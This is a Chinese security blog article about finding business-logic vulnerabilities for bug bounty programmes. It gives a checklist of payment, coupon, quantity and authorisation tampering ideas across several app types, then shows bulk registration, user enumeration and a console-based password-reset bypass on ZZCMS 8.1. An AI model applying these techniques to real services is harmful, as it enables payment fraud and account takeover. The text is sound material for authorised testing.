<html>
<head>
<title>SRC逻辑漏洞挖掘详解以及思路和技巧</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
SRC逻辑漏洞挖掘详解以及思路和技巧
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    Ca01H
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-02-18</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.5rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" data-mpa-powered-by="yiban.io">0X00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逻辑漏洞概述</a></h2><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">由于程序逻辑不严谨或逻辑太过复杂，导致一些逻辑分支不能正常处理或处理错误，统称为业务逻辑漏洞。常见的逻辑漏洞有交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等，下图是简单的逻辑漏洞总结，在挖掘的过程中更多的时候需要脑洞大开：</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.647419072615923" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/1_FWDer8RG4iceq9xzic5tebNZibSygA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7Hxwe20rU9aiampArpx1oTbQEeflgFWDer8RG4iceq9xzic5tebNZibSygA/640?wx_fmt=png'" data-type="png" data-w="1143" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">挖掘逻辑漏洞的过程中，需要一些技巧和非常规思路，有点像边缘测试的思想。一般的思路是：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题</span></code></pre></section><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 1.5rem;font-weight: bold;">0X01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逻辑漏洞分类</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer">0X01:饮料贩卖机</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">替换订单ID，创建订单时在支付界面，在此创建订单替换订单ID（高价替换低价）</span></code><code><span class="code-snippet_outer">无限新用户优惠订单，重复创建优惠订单</span></code><code><span class="code-snippet_outer">替换优惠卷ID（未达到条件使用）</span></code><code><span class="code-snippet_outer">个别情况订单数量为1.99时，客户端只支付1元，实际上服务器认为支付了2元。</span></code><code><span class="code-snippet_outer">取货时并发（真实案例）</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X02:直播</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">快速进出房间炸房</span></code><code><span class="code-snippet_outer">无限发送点赞协议</span></code><code><span class="code-snippet_outer">修改礼物数量，0，小数，负数，特定值（一般情况下为1073741824）</span></code><code><span class="code-snippet_outer">修改礼物ID，遍历尝试是否有隐藏ID。</span></code><code><span class="code-snippet_outer">并发送礼物，抽奖</span></code><code><span class="code-snippet_outer">无限创建首次优惠订单，有些首次优惠订单是一个特殊的pid，这种的直接替换pid进行支付。有些是相同的ID，这种的提前创建订单，记录多个订单号在依次修改订单支付。</span></code><code><span class="code-snippet_outer">刷屏：发言刷屏，分享，点赞等有提示的地方刷屏</span></code><code><span class="code-snippet_outer">房间内可以申请的地方进行申请取消操作，看看是否能炸房。</span></code><code><span class="code-snippet_outer">越权踢人，增加管理员，关闭房间等操作。</span></code><code><span class="code-snippet_outer">发送的表情是否可以修改长宽（真实案例）</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X03&nbsp;:购物app</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">购买数量：为0，小数，负数，正负值（A为-1，B为2，总值为1）</span></code><code><span class="code-snippet_outer">代金卷：并发领取，遍历领取，同一个代金卷重复使用，未满足条件使用代金卷</span></code><code><span class="code-snippet_outer">越权：登陆，操作别人订单，修改资料</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X04:外卖</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">商品数量，0，负数，小数，特定值，正负数（A为-1，B为2，总值为1）</span></code><code><span class="code-snippet_outer">送餐员评价修改，星级，打赏金额（小数，负数）</span></code><code><span class="code-snippet_outer">商品评价，星级，评论字数，上传图片是否可以自定义格式，</span></code><code><span class="code-snippet_outer">订单超出送餐地址</span></code><code><span class="code-snippet_outer">强行货到付款，取消订单，退款</span></code><code><span class="code-snippet_outer">越权操作别人订单，登陆</span></code><code><span class="code-snippet_outer">优惠购买会员（重复使用优惠购买）</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X05:交易平台</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">钱包并发提现，负数提现</span></code><code><span class="code-snippet_outer">使用钱包支付时多个订单并发支付（是否支付金额能大于余额）</span></code><code><span class="code-snippet_outer">转账负数，并发转账</span></code><code><span class="code-snippet_outer">上架商品突破限制，例如数量，字数。</span></code><code><span class="code-snippet_outer">替换订单，创建订单号如果订单状态可修改，先进到支付界面，然后将订单修改成更大的金额，然后支付提前进入的支付界面</span></code><code><span class="code-snippet_outer">数量修改</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X06:社交</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">强行举报（读取本地消息上传那种）</span></code><code><span class="code-snippet_outer">强行加好友（一般尝试重发通过好友这条协议）</span></code><code><span class="code-snippet_outer">自由修改号码（靓号类）</span></code><code><span class="code-snippet_outer">群管理无限禁言</span></code><code><span class="code-snippet_outer">越权禁言，替人，拉黑</span></code><code><span class="code-snippet_outer">会员修改金额，数量。无限优惠购买</span></code><code><span class="code-snippet_outer">非会员使用会员功能</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X07:漫画</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">打赏金额为负数，小数，特定值（溢出）</span></code><code><span class="code-snippet_outer">越权删除评论，登陆</span></code><code><span class="code-snippet_outer">修改充值金额</span></code><code><span class="code-snippet_outer">付费漫画免费看</span></code><code><span class="code-snippet_outer">评论图片数量过多会导致客户端加载卡死</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X08:音乐</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">唱歌类软件修改上传分数等参数</span></code><code><span class="code-snippet_outer">付费下载尝试替换下载ID</span></code><code><span class="code-snippet_outer">修改付费下载金额</span></code><code><span class="code-snippet_outer">F12查看下是否有歌曲地址</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">0X09:网约车</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">无限叫车，重复发送协议造成市场混乱</span></code><code><span class="code-snippet_outer">修改评价分数</span></code><code><span class="code-snippet_outer">修改限时优惠叫车关键参数</span></code><code><span class="code-snippet_outer">替换优惠卷</span></code><code><span class="code-snippet_outer">越权操作其他订单</span></code></pre></section><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">业务逻辑漏洞需要对业务熟悉，有很强的逻辑思维能力，所以下面主要描述一下ZZCMS8.1中注册、登录和密码找回出现的漏洞逻辑，再尽量多和全的收集整理相关场景。<br  /></p><h2 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.5rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0X02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逻辑漏洞利用实例</h2><h3 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 1.25rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">ZZCMS 8.1</h3><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">批量注册</h4><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">我们把注册功能填写相关信息，然后抓包：</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.4146981627296588" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/2_58tnWTuL1QLzzSsGGokfTiby0CCYtw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7bLh9PicAQBLPz30QYsVoUtiazBg58tnWTuL1QLzzSsGGokfTiby0CCYtw/640?wx_fmt=png'" data-type="png" data-w="1905" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">将数据包发送到repeater，每次修改username值，发现，只需要修改username值就可以注册成功用户，图形验证码无效，并且未对电话，邮箱等信息校验，可批量注册。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.4155299055613851" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/3_ic3ZgoNC8Eia36yMjsP13PSfI0CBrw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7yQSL5Otc017CF1aRcn21Zvbw4pic3ZgoNC8Eia36yMjsP13PSfI0CBrw/640?wx_fmt=png'" data-type="png" data-w="1906" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.40451206715634835" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/4_BXOUFwXzufTEC5xq46CiciaSAtnvDw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7Qic1aRADhu3M7NOv7BQ2cAFzzroBXOUFwXzufTEC5xq46CiciaSAtnvDw/640?wx_fmt=png'" data-type="png" data-w="1906" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">批量猜解用户</h4><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">同样是注册功能，在输入用户名时，发现会提示用户名是否存在，猜测该位置可以猜测哪些用户注册过该网站。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.8784461152882206" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/5_ZZ5zEjZycUErANqicpthaeAS6rTf7g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7Ah4Ed7mrJJFdvQia7zYJPqNx7JZZ5zEjZycUErANqicpthaeAS6rTf7g/640?wx_fmt=png'" data-type="png" data-w="798" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">抓取该位置数据包发现，会对用户名id进行判断，是否存在，是否符合规则，由此我们可以批量探测用户，发现可以批量探测已注册过的用户：</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.9230769230769231" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/6_4gvKAGWNQM66EvvoeyS7hj6qicLCrw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7icMibKfyAnMt76XxCcXWXIcfFZx4gvKAGWNQM66EvvoeyS7hj6qicLCrw/640?wx_fmt=png'" data-type="png" data-w="858" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">任意密码重置</h4><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在忘记密码功能，我们输入用户名正确后会进行短信验证码，通过手机验证码或者邮箱验证码。</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.4703125" src="图片/HACK学习呀_2020-02-18_SRC逻辑漏洞挖掘详解以及思路和技巧/7_cEactsKjibACD6gvM6LkV1QrD8etFw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9DQ32kayJBMx0hdJDGUQg7EXicodPP3MqSJYQTm37GUqMcYqcEactsKjibACD6gvM6LkV1QrD8etFw/640?wx_fmt=png'" data-type="png" data-w="1920" style="box-sizing: inherit;border-style: none;max-height: auto !important;display: block;margin-left: auto;margin-right: auto;cursor: zoom-in;"  /></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在验证码功能中输入验证码进行验证，发现其中有一段JavaScript代码<code style="box-sizing: inherit;font family: consolas, Menlo, monospace;font-size: 13.6px;background: rgb(252, 242, 242);border-radius: 3px;color: rgb(215, 62, 72);line-height: 1.25;padding: 2px 4px;">document.userreg.yzm_mobile2.value=='no'</code>是用来验证验证码是否正确，那么就可以直接在控制台直接改变这个值就可以绕过验证码：</p><p style="box-sizing: 